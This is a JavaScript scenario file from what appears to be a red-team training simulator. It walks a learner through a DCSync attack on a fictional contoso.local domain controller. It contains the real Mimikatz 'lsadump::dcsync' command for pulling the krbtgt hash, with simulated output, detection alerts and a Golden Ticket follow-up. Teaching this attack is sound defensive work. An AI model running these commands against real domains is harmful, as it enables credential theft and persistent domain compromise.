/**
 * DCSync Attack Scenario
 *
 * This scenario simulates the DCSync attack, where an attacker uses
 * directory replication privileges to request password hashes directly
 * from a domain controller.
 *
 * THIS SCENARIO ASSUMES:
 * 1. The user has gained an administrative shell on the Domain Controller
 * (DC01) by completing the Pass-the-Hash (Mission 4) scenario.
 */

export const dcsyncScenario = {
  id: 'dcsync',
  title: 'DCSync: Replicating Password Hashes',
  description:
    'Learn how attackers leverage DCSync to replicate password hashes from a domain controller.',

  // Network configuration
  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  // Guide content for the sidebar
  guide: {
    overview: `**DCSync** allows an attacker with directory replication privileges (like a Domain Admin) to request password hashes directly from Active Directory.

**Attack Flow:**
1. Use your administrative shell on the DC to run Mimikatz.
2. Use Mimikatz's 'lsadump::dcsync' module to request the 'krbtgt' account hash.
3. Use the stolen hash to forge Golden Tickets for persistence.

**Why This Matters:**
DCSync is the final step to "owning" the domain. With the 'krbtgt' hash, you can forge Kerberos tickets for *any* user and maintain persistent access, even if all admin passwords are changed.`,
    steps: [
      {
        number: 1,
        title: 'Perform DCSync with Mimikatz',
        description:
          'You are already administrator on the DC from the previous mission. Now, run Mimikatz to request the password hash of the "krbtgt" account.',
        command:
          'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        tip: 'Replicating the KRBTGT hash is the key to creating Golden Tickets.'
      },
      {
        number: 2,
        title: 'Review the Extracted Hash',
        description:
          'The DCSync output contains the NTLM hash for the krbtgt account. This is the "master key" for the domain.',
        command: null,
        tip:
          'This hash is now in your "Files" tab. You can use it in the next mission to forge Golden Tickets.'
      }
    ]
  },

  // Simulation steps executed in the terminal
  steps: [
    {
      id: 1,
      // Accept multiple valid ways of invoking DCSync
      expectedCommands: [
        'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        'mimikatz "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        'mimikatz.exe "lsadump::dcsync /domain:CONTOSO.LOCAL /user:krbtgt"',
        'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt$"'
      ],
      // Provide helpful messages for common mistakes
      commonMistakes: [
        {
          pattern: '^mimikatz(\\.exe)?\\s+lsadump::dcsync',
          message: 'Wrap the lsadump::dcsync command in quotes: \"lsadump::dcsync /domain:contoso.local /user:krbtgt\"'
        },
        {
          pattern: '^mimikatz(\\.exe)?\\s*$',
          message: 'You need to specify the lsadump::dcsync module and provide the /domain and /user parameters.'
        }
      ],
      attackerOutput: [
        'C:\\Windows\\System32> mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
        '[*] Using DCSync to replicate KRBTGT account credentials...',
        '[*] Connecting to DC01.contoso.local...',
        '[+] Authenticated with replication privileges',
        '[*] Requesting secrets for user: krbtgt',
        '[+] DCSync successful! Here are the credentials:',
        'User : krbtgt$',
        'NTLM : fffffffffffffffffffffffffffffff0',
        'LM   : aad3b435b51404eeaad3b435b51404ee',
        '[+] Hashes retrieved and stored'
      ],
      serverOutput: [
        '[DS-REPL] DRSGetNCChanges request from 10.0.1.10 (localhost)',
        '[DS-REPL] Object: krbtgt',
        '[AUDIT] Replication data request responded',
        '[ALERT] CRITICAL: A DCSync attack was performed from the Domain Controller itself!'
      ],
      delay: 700
    },
    {
      id: 2,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] DCSync Attack Summary',
        '[+] ============================================',
        '[+] Hashes extracted: 1 (krbtgt)',
        '[+] DOMAIN COMPROMISED',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use krbtgt NTLM hash to forge a Golden Ticket',
        '[*] 2. Gain persistent, undetectable access to all systems',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '',
        '[ALERT] SECURITY INCIDENT DETECTED',
        '[ALERT] KRBTGT account hash has been compromised.',
        '[ALERT] Recommend immediate (and double) KRBTGT password reset.',
        '[ALERT] All domain Kerberos tickets are now untrusted.'
      ],
      delay: 400
    }
  ]
};

export default dcsyncScenario;